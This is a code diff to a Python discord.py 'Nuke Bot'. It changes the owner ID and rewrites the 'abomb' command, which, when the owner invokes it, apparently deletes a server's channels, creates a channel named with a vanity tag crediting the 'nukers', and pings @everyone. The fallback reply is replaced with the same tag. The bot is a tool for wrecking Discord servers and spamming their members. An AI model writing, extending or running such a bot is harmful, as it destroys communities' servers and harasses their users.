@@ -8,7 +8,7 @@ client = commands.Bot(command_prefix=commands.when_mentioned_or("d/", "D/"),  he
 async def on_ready():
   print('Nuke Bot Is Ready to go!')
 
-owner = 517020964261855232
+owner = 538788611911319553
 
 @client.command()
 async def abomb(ctx):
@@ -21,12 +21,12 @@ async def abomb(ctx):
         except:
             pass
 
-    await ctx.guild.create_text_channel('nuked')
-    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
-    await channel.send("@everyone\nKABOOOM\n")
+    await ctx.guild.create_text_channel('ANDREW TATE ON TOP NUKED BY DAMO AND HXSSXIN')
+    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='ANDREW TATE ON TOP NUKED BY DAMO AND HXSSXIN')
+    await channel.send("@everyone ANDREW TATE ON TOP NUKED BY DAMO AND HXSSXIN")
 
   else:
-    await ctx.send("No Lmao")
+    await ctx.send("ANDREW TATE ON TOP NUKED BY DAMO AND HXSSXIN")
 
 
 @client.command()
